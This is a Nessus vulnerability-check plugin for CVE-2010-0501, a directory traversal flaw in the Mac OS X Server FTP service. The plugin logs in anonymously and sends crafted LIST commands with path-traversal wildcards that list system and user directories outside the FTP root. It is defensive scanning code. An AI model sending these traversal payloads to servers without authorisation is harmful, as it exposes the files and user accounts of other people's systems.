#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(45381);
  script_version("$Revision: 1.11 $");
  script_cvs_date("$Date: 2015/09/24 21:17:11 $");

  script_cve_id("CVE-2010-0501");
  script_bugtraq_id(39020);
  script_osvdb_id(63378);

  script_name(english:"Mac OS X FTP Server Directory Traversal");
  script_summary(english:"Attempts to get the listing of files located outside the FTPRoot.");

  script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is affected by a directory traversal
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote FTP server contains a directory traversal vulnerability
that may allow an anonymous user to retrieve files outside the FTP
root directory.");
  script_set_attribute(attribute:"see_also", value:"http://support.apple.com/kb/HT4077");
  # http://lists.apple.com/archives/security-announce/2010/Mar/msg00001.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?a6609f13");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/advisories/19364");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Mac OS X Server 10.6.3 or apply Security Update 2010-002.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"plugin_publication_date", value:"2010/03/30");
  script_set_attribute(attribute:"vuln_publication_date", value:"2010/03/29");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/03/30");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"FTP");

  script_copyright(english:"This script is Copyright (C) 2010-2015 Tenable Network Security, Inc.");

  script_dependencies("ftpserver_detect_type_nd_version.nasl", "ftp_anonymous.nasl");
  script_require_keys("ftp/login");
  script_exclude_keys("ftp/ncftpd", "ftp/msftpd", "global_settings/supplied_logins_only");
  script_require_ports("Services/ftp", 21);
  exit(0);
}

#
# The script code starts here
#
include("audit.inc");
include("global_settings.inc");
include("ftp_func.inc");
include("misc_func.inc");

port = get_ftp_port(default: 21);

soc = open_sock_tcp(port);
if (!soc) audit(AUDIT_SOCK_FAIL, port);
if (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);

if(!ftp_authenticate(socket:soc, user:"anonymous", pass:string("nessus@", get_host_name()))) exit(0, "The FTP server on port "+port+" does not accept anonymous connections.");

send(socket:soc, data:'STAT\r\n');
result = ftp_recv_line(socket:soc);
if (!result || "Mac OS X Server"  >!< result ) exit(0, "The FTP server on port "+port+" is not running Mac OS X Server.");

p = ftp_pasv(socket:soc);
if(!p) exit(1, "PASV command failed on port "+port+".");

soc2 = open_sock_tcp(p, transport:get_port_transport(port));
if (!soc2) exit(1, "Failed to open a socket on PASV port "+p+".");

# Do not try to access /etc/passwd as many FTP servers have such a chrooted etc/ directory
# [Avoid matching on /Users/Shared]
send(socket:soc, data:'LIST .?/.?/.?/.?/.?/.?/.?/.?/Syst?m/Lib*\r\n');
r = ftp_recv_line(socket:soc);
result = ftp_recv_listing(socket:soc2);
close(soc2);
r = ftp_recv_line(socket:soc);
if ( r =~ "^553 .*/System/Library" )
{
  p = ftp_pasv(socket:soc);
  if(!p) exit(1, "Can't get a port for a passive FTP connection.");

  soc2 = open_sock_tcp(p, transport:get_port_transport(port));
  if(soc2)
  {
    send(socket:soc, data:'LIST ./.?/.?/.?/.?/.?/.?/.?/Us?r?/[a-zA-RT-Z0-9_]*\r\n');
    r = ftp_recv_line(socket:soc);
    result = ftp_recv_listing(socket:soc2);
    close(soc2);
    r = ftp_recv_line(socket:soc);
    if ( "/Users/" >< r && "[a-z" >!< r )
    {
      ftp_close(socket: soc);
      user = ereg_replace(pattern:'.*(/Users/.*):.*', string:chomp(r), replace:"\1");
      security_warning(port:port, extra:'\nIt was possible to use the flaw to guess the existence of the following directory :\n\n' + user);
      exit(0);
    }
  }
  security_warning(port);
}
else exit(0, "The FTP server on port "+port+" is patched.");
